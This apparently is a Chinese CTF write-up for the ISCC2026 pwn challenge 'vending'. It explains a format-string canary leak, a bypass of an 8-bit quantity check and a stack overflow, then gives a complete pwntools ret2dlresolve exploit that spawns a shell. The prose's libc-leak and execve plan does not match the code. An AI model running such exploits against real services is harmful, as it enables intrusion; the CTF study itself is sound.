+++
title = "vending"
date = "2026-05-06"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++
## 题目信息

目标地址：`39.96.193.120:33334`

程序保护：

```bash
Arch: amd64
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: No PIE
```

## 漏洞分析

这题一共有三处关键点：

1. `customer ID` 处存在格式化字符串漏洞

```c
printf("Welcome, ");
printf(id_buf);
```

因此可以直接泄露栈上和内存中的内容。

2. 数量检查只比较了低 8 位

程序读入数量后，实际比较的是 `al` 是否小于等于 `3`，所以像 `256`、`512` 这类低字节为 `0` 的值都能绕过限制。

3. 商品名输入处存在栈溢出


```c
char product[0x100];
read(0, product, num);
```

`product` 只有 `0x100` 字节，但 `num` 可以绕过检查，因此可以造成溢出。

溢出到返回地址的偏移为：

```text
0x108
```

## 利用思路

`main` 会调用 `vuln()` 三次，所以可以分三轮完成利用。

### 第一轮：泄露 canary

使用：
```python
%45$p
```
可以稳定泄露栈 canary。

### 第二轮：泄露 libc

继续利用格式化字符串，构造：
```python
b"%9$sAAAA" + p64(elf.got["printf"])

```

含义：
- `%9$s` 读取第 9 个参数指向的字符串
- 我们在 payload 末尾追加了 `printf@got`
- 因此可以泄露 `printf` 在 libc 中的真实地址

拿到 `printf@libc` 后即可计算 libc 基址。

### 第三轮：绕过限制并 ROP

数量输入使用:
```text
512
```
原因：
- `512 & 0xff == 0`，能绕过检查
- `512` 又足够大，能覆盖到返回地址
随后构造 ROP，调用：

```c
execve("/bin/sh", 0, 0)
```
## Exp
```python
from pathlib import Path  
  
from pwn import *  
  
context.clear(arch="amd64", os="linux", log_level="info")  
  
BASE_DIR = Path(__file__).resolve().parent  
elf = ELF(str(BASE_DIR / "attachment-16"), checksec=False)  
  
HOST = "39.96.193.120"  
PORT = 33334  
  
OFFSET = 0x108  
RET = 0x40101A  
CSU_CALL = 0x401480  
CSU_POP = 0x40149A  
  
  
def start():  
    return remote(HOST, PORT)  
  
  
def leak_canary(io):  
    io.recvuntil(b"Please enter your customer ID:\n")  
    io.send(b"%45$p\n")  
    data = io.recvuntil(b"quantity you need:\n")  
    canary = int(data.split(b"Welcome, ", 1)[1].split(b"\n", 1)[0], 16)  
    io.send(b"0\n")  
    io.recvuntil(b"Please enter the name of the product you need:\n")  
    io.recvuntil(b"Order confirmed!\n")  
    io.recvuntil(b"Please enter your customer ID:\n")  
    return canary  
  
  
def csu_read(data_addr, size):  
    return flat(  
        CSU_POP,  
        0,              # rbx  
        1,              # rbp  
        0,              # r12 -> edi = 0  
        data_addr,      # r13 -> rsi  
        size,           # r14 -> rdx  
        elf.got["read"],# r15 -> [r15 + rbx*8]  
        CSU_CALL,  
        0,              # add rsp, 8  
        0, 0, 0, 0, 0, 0,  
    )  
  
  
def main():  
    io = start()  
  
    canary = leak_canary(io)  
    log.success(f"canary = {hex(canary)}")  
  
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])  
    rop = ROP(elf)  
    rop.raw(RET)  
    rop.raw(csu_read(dlresolve.data_addr, len(dlresolve.payload)))  
    rop.ret2dlresolve(dlresolve)  
  
    io.send(b"guest\n")  
    io.recvuntil(b"quantity you need:\n")  
    io.send(b"512\n")  
    io.recvuntil(b"Please enter the name of the product you need:\n")  
  
    payload = flat(  
        b"A" * OFFSET,  
        canary,  
        b"B" * 8,  
        rop.chain(),  
    ).ljust(512, b"\x00")  
  
    io.send(payload)  
    io.send(dlresolve.payload)  
    io.interactive()  
  
if __name__ == "__main__":  
    main()
```
## 附件下载

- [attachment-16](attachment-16)

